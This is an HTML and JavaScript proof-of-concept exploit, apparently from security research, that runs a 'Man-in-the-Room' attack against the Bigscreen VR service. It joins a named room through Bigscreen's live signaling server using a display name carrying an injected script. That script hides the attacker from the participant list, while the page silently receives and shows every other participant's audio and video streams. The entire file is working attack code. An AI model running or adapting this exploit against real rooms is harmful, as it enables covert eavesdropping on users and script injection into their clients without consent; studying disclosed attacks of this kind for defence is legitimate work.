<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="./bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <div class="col-sm">
            <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
            <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
            <form class="form-inline">
                <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
                <div class="input-group mb-2 mr-sm-2">
                  <div class="input-group-prepend">
                    <span class="input-group-text">room-</span>
                  </div>
                  <input id="roomIdInput" type="text" class="form-control" placeholder="8we1jdc4">
                </div>
                <button id="joinRoomButton" type="button" class="btn btn-outline-primary mb-2 mr-sm-2">Join</button>
            </form>
        </div>
    </div>
    <div id="users" class="row"></div>
</div>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="./jquery-3.3.1.slim.min.js"></script>
<script src="./popper.min.js"></script>
<script src="./bootstrap.min.js"></script>
<script src="./adapter-latest.js"></script>
<script src="./msgpack.min.js"></script>
<script>
'use strict';

const offerOptions = {
  offerToReceiveAudio: 1,
  offerToReceiveVideo: 1
};

function Connection(userId, scid, pcid){
    this.userId = userId;
    this.scid = scid;
    this.pcid = pcid;
    this.isStarted = false;
    this.isInitiator = false;
    this.rtcPeerConnection = null;
    this.remoteStream = null;
    this.videoElement = null;
    this.cardElement = null;
}
let connections = [];

let allRemoteStreams = [];
let roomState;

let turnReady;

let dataChannelSend, dataChannelReceive;

const pcConfig = {
    'iceServers': [{
        'urls': 'stun:stun.l.google.com:19302'
    }]
};

<!--region variables for Bigscreen signaling protocol-->
let textName = '__Mallory__';
let NAME = textName + '<scr' + 'ipt>Array.prototype.forEach.call(document.querySelectorAll("#room-participants li"), function(e){if(e.querySelector("h3.user-name").firstChild.nodeValue === "'+textName+'"){e.remove()}});</sc'+'ript>';
let roomId;
let myUserId;
let myUuid = generateBigscreenUuid();
let unityVersion = '0.34.0';
let mySteamId = '';
let myOculusId = '';



<!--endregion-->

const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
let websocket;


<!--region GUI bindings -->
const joinRoomButton = document.getElementById('joinRoomButton');
const usersSectionElement = document.getElementById('users');
const roomIdInput = document.getElementById('roomIdInput');
<!--endregion-->

joinRoomButton.addEventListener("click", function () {
    roomId = 'room-' + roomIdInput.value;
    roomIdInput.readOnly = true;
    joinRoomButton.disabled = true;

    websocket = new WebSocket(bigscreenSignalUrl);
    websocket.binaryType = 'arraybuffer';
    websocket.onopen = function (event) {
        console.log('connected', event);
        sendMessage({type: 'register-desktop'});
        console.log('registered');
        joinRoom();
    };
    websocket.onclose = function (event) {
        console.log('onClose disconnected', event);
    };
    websocket.onmessage = function (event) {
        onMessage(event);
    };
    websocket.onerror = function (event) {
        console.log('onError event', event);
    };
});

////////////////////////////////////////////////

function showUsernames() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        console.log('onreadystatechange', this.readyState);
        if (this.readyState === 4 && this.status === 200) {
           console.log(xhttp.responseText);
           roomState = JSON.parse(xhttp.responseText);
            for (let i = 0; i < connections.length; i++) {
                let c = connections[i];
                if(c.cardElement){
                    let userNameElement = c.cardElement.getElementsByClassName('username')[0];
                    userNameElement.innerHTML = ' ';
                    userNameElement.appendChild(document.createTextNode(roomState[c.userId + '.name']));

                    let userIdElement = c.cardElement.getElementsByClassName('userId')[0];
                    userIdElement.innerHTML = ' ';
                    userIdElement.appendChild(document.createTextNode(c.userId));
                }
            }
        }
    };
    xhttp.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId='+roomId, true);
    xhttp.send();
}

function sendMessage(message) {
    console.log('sendMessage', message);
    websocket.send(msgpack.encode(message));
}

function onMessage(event) {
    let message = msgpack.decode(new Uint8Array(event.data));
    console.log('onMessage', message);

    switch (message.type) {
        case "room-latest":
        case "admin":
        case "linkedpc-joined":
        case "linkedpc-left":
        case "party-join":
        case "user-ready":
        case "user-left":
        case "room-join-fail":
        case "room-created":
        case "room-environment":
        case "room-private":
        case "room-public":
        case "events":
        case "server-time":
            console.log('received message ignored', message);
            break;

        case "user-joined":
            if(message.uuid === myUuid){
                myUserId = message.userId;
                console.log('set myUserId', myUserId);
                sendUserReady();
                console.log('user ready');
            }
            break;

        case 'ice':
            console.log('onMessage received ICE');
            console.assert(message.fromDevice === 'desktop', message.fromDevice);

            const candidateStartPos = message.value.indexOf('candidate:');
            let beforeCandidate  = message.value.slice(0,candidateStartPos);
            let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
            let sdpMid = beforeCandidate.slice(
                beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
                beforeCandidate.indexOf('bigscreen_sdp_mid'));
            let candidate = new RTCIceCandidate({
                sdpMid: sdpMid,
                sdpMLineIndex: sdpMLineIndex,
                candidate: message.value.slice(candidateStartPos)
            });
            {
                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
                console.log('ice conn', connection);
                connection.rtcPeerConnection.addIceCandidate(candidate);
            }
            break;
        case 'offer':
            console.log('onMessage received OFFER');
            console.assert(message.fromDevice === 'desktop', message.fromDevice);

            {
                let connection = new Connection(message.fromUser, message.SCID, message.PCID);
                connections.push(connection);

                if (!connection.isInitiator && !connection.isStarted) {
                    maybeStart(connection);
                }
                connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
                    {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
                doAnswer(connection);
            }
            break;
        case 'answer':
            console.error('onMessage received ANSWER');

            console.assert(message.roomId === roomId, message.roomId, roomId);
            console.assert(message.targetUser === myUserId, message.targetUser, myUserId);
            console.assert(message.fromDevice === 'desktop', message.fromDevice);
            console.assert(message.targetDevice === 'desktop', message.targetDevice);
            {
                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
                if (connection.isStarted) {
                    connection.setRemoteDescription(new RTCSessionDescription(
                        {
                            type: message.type,
                            sdp: message.value,
                            scid: connection.scid,
                            pcid: connection.pcid
                        }));
                }
            }
            break;
        default:
            console.error('Unexpected message type (server to client):', message);
            break;
    }
}

function generateBigscreenUuid() {
  function bigscreenRand() {
    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
  }
  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
}

function joinRoom(){
    sendMessage({
        'type': "room-join",
        'roomId': roomId,
        'name': NAME,
        'uuid': myUuid,
        'version': unityVersion,
        'steamId': mySteamId,
        'oculusId': myOculusId
    });
}

function sendUserReady(){
    sendMessage({
        type: "user-ready",
        roomId: roomId,
        userId: myUserId
    })
}
////////////////////////////////////////////////////

if (location.hostname !== 'localhost') {
    requestTurn(
        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
    );
}

function maybeStart(connection) {
    if (!connection.isStarted) {
        try {
            connection.rtcPeerConnection = new RTCPeerConnection(null);
            connection.rtcPeerConnection.onicecandidate = function (event) {
                console.log('icecandidate event: ', event);
                if (event.candidate) {
                    sendMessage({
                        type: 'ice',
                        roomId: roomId,
                        value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
                            + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
                        fromDevice: 'desktop',
                        targetDevice: 'desktop',
                        fromUser: myUserId,
                        targetUser: connection.userId,
                        SCID: connection.scid,
                        PCID: connection.pcid,
                    });
                } else {
                    console.log('End of candidates.');
                }
            };
            connection.rtcPeerConnection.ontrack  = function (event) {
                console.log('Remote streams added.');
                console.log(event.streams);
                allRemoteStreams.push(event.streams);
                connection.remoteStream = event.streams[0];
                if(connection.pcid === 0){
                    if(connection.videoElement === null){
                        let template = document.createElement('template');
                        template.innerHTML = '<div class="col-sm-3">\n' +
                            '           <div class="card">\n' +
                            '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
                            '              <div class="card-body">\n' +
                            '                <h5 class="username card-title">Username</h5>\n' +
                            '                <h6 class="userId card-subtitle mb-2 text-muted">UserId</h6>\n' +
                            '                <p class="card-text"></p>\n' +
                            '              </div>\n' +
                            '            </div>\n' +
                            '        </div>';
                        let cardElement = template.content.firstChild;
                        connection.cardElement = cardElement;
                        connection.videoElement = cardElement.getElementsByTagName('video')[0];
                        usersSectionElement.appendChild(cardElement);
                        showUsernames();
                    }
                    connection.videoElement.srcObject = event.streams[0];
                }
            };
            connection.rtcPeerConnection.onremovestream = function (event) {
                console.log('Remote stream removed. Event: ', event);
            };

            console.log('Created RTCPeerConnnection');
        } catch (e) {
            console.log('Failed to create PeerConnection, exception: ' + e.message);
            alert('Cannot create RTCPeerConnection object.');
            return;
        }
        if (connection.isInitiator){
            dataChannelSend = connection.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
            dataChannelSend.onopen = onSendChannelStateChangeDirect;
            dataChannelSend.onclose = onSendChannelStateChangeDirect;
        }
        else{
            connection.rtcPeerConnection.ondatachannel = function(event) {
                console.log('Receive Channel Callback');
                dataChannelReceive = event.channel;
                dataChannelReceive.onmessage = function(event){
                    //console.error('Received Message', connection, event.data);
                };
                dataChannelReceive.onopen = onReceiveChannelStateChangeDirect;
                dataChannelReceive.onclose = onReceiveChannelStateChangeDirect;
            };
        }

        connection.isStarted = true;
        console.log('connection.isInitiator', connection.isInitiator);
        if (connection.isInitiator) {
            console.log('Sending offer to peer');
            connection.rtcPeerConnection.createOffer(offerOptions).then(
                function(sdp){setLocalAndSendMessage(sdp, connection)}, handleCreateOfferError);
        }
    }
}

function onSendChannelStateChangeDirect() {
  const readyState = dataChannelSend.readyState;
  console.log('dataChannelSend Send channel state is: ' + readyState);
}
function onReceiveChannelStateChangeDirect() {
  const readyState = dataChannelReceive.readyState;
  console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
}

/////////////////////////////////////////////////////////




function handleCreateOfferError(event) {
    console.log('createOffer() error: ', event);
}

function setLocalAndSendMessage(sessionDescription, connection) {
    connection.rtcPeerConnection.setLocalDescription(sessionDescription);
    let sessionDescriptionMessage = {
        type: sessionDescription.type,
        roomId: roomId,
        value: sessionDescription.sdp,
        fromDevice: 'desktop',
        targetDevice: 'desktop',
        fromUser: myUserId,
        targetUser: connection.userId,
        SCID: connection.scid,
        PCID: connection.pcid,
    };
    console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
    sendMessage(sessionDescriptionMessage);
}

function doAnswer(connection) {
    console.log('Sending answer to peer.');
    connection.rtcPeerConnection.createAnswer().then(
        function(sdp){setLocalAndSendMessage(sdp, connection)},
        onCreateSessionDescriptionError
    );
}

function onCreateSessionDescriptionError(error) {
    console.log('Failed to create session description: ' + error.toString());
}

function requestTurn(turnURL) {
    let turnExists = false;
    for (let i in pcConfig.iceServers) {
        if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
            turnExists = true;
            turnReady = true;
            break;
        }
    }
    if (!turnExists) {
        console.log('Getting TURN server from ', turnURL);
        // No TURN server. Get one from computeengineondemand.appspot.com:
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                let turnServer = JSON.parse(xhr.responseText);
                console.log('Got TURN server: ', turnServer);
                pcConfig.iceServers.push({
                    'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
                    'credential': turnServer.password
                });
                turnReady = true;
            }
        };
        xhr.open('GET', turnURL, true);
        xhr.send();
    }
}

</script>
</body>
</html>
